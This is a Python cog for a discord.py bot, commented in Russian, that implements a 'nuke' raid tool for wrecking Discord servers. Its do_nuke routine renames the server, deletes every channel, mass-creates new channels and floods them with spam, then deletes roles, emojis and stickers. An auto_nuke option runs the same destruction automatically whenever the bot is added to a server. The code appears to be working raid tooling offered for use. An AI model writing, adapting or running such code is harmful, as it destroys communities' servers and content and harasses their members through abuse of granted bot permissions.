import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import string
import os
import config
import random

EMOJI_LIMIT_BY_BOOST = {0: 50, 1: 100, 2: 150, 3: 250}

def get_emoji_limit(guild: discord.Guild) -> int:
    return EMOJI_LIMIT_BY_BOOST.get(guild.premium_tier, 50)


async def do_nuke(guild: discord.Guild, bot_user):
    # Меняем название сервера
    try:
        await guild.edit(name=config.GUILD_NAME)
    except Exception as e:
        print(f"Failed to edit guild: {e}")

    # Удаляем каналы
    await asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True)

    # Создаём каналы
    new_channels = await asyncio.gather(
        *[guild.create_text_channel(name=config.GUILD_NAME) for _ in range(config.CHANNELS_COUNT)],
        return_exceptions=True
    )

    # Спамим
    spam_tasks = []
    for channel in new_channels:
        if isinstance(channel, discord.TextChannel):
            for _ in range(config.SPAM_COUNT):
                spam_tasks.append(channel.send(config.SPAM_TEXT))
    await asyncio.gather(*spam_tasks, return_exceptions=True)

    # Удаляем роли
    bot_role = guild.me.top_role
    await asyncio.gather(
        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
        return_exceptions=True
    )

    # Удаляем эмодзи и стикеры
    await asyncio.gather(
        *[e.delete() for e in guild.emojis],
        *[s.delete() for s in guild.stickers],
        return_exceptions=True
    )

    # Создаём эмодзи
    emojii_path = "assets/image/emojii.png"
    try:
        if os.path.exists(emojii_path):
            with open(emojii_path, "rb") as f:
                image_bytes = f.read()
            can_create = max(0, get_emoji_limit(guild) - len(guild.emojis))
            tasks = [
                guild.create_custom_emoji(
                    name=''.join(random.choices(string.ascii_letters + string.digits, k=8)),
                    image=image_bytes
                ) for _ in range(can_create)
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
    except Exception as e:
        print(f"Error creating emojis: {e}")

    print("Nuke completed.")


class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="nuke", description="Полный краш сервера")
    @app_commands.checks.has_permissions(administrator=True)
    async def nuke(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        await do_nuke(interaction.guild, self.bot.user)

    @app_commands.command(name="auto_nuke", description="Авто-краш при входе бота на сервер")
    @app_commands.describe(state="on или off")
    @app_commands.checks.has_permissions(administrator=True)
    async def auto_nuke(self, interaction: discord.Interaction, state: str):
        if state.lower() == "on":
            config.AUTO_NUKE = True
            await interaction.response.send_message("✅ Авто-краш включен.", ephemeral=True)
        elif state.lower() == "off":
            config.AUTO_NUKE = False
            await interaction.response.send_message("❌ Авто-краш выключен.", ephemeral=True)
        else:
            await interaction.response.send_message("Используй: `/auto_nuke on` или `/auto_nuke off`", ephemeral=True)

    @commands.Cog.listener()
    async def on_guild_join(self, guild: discord.Guild):
        if config.AUTO_NUKE:
            print(f"Авто-краш запущен для сервера: {guild.name}")
            await asyncio.sleep(2)
            await do_nuke(guild, self.bot.user)


async def setup(bot):
    await bot.add_cog(Nuke(bot))
